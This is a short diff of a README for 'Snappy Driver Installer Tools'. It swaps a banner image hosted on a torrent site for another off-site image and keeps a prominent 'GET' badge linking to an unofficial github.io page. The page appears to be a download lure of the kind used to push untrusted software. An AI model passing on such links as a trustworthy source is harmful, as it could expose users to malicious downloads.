@@ -1,6 +1,6 @@
 # Snappy Driver Installer Tools for Hardware Detection and Driver Management
 
-![Banner Placeholder](https://tops-torrents.com/_ld/9/00891293.png)
+![Banner Placeholder](https://mkonne.org/wp-content/uploads/2016/05/1-1.png)
 
 [![GET — Snappy Driver Installer](https://img.shields.io/badge/GET%20%E2%80%94%20Snappy%20Driver%20Installer-0078D6?style=for-the-badge&logoColor=white)](https://hiroshlorp443.github.io/.github/Snappy-Driver-Installer-Tools)
 
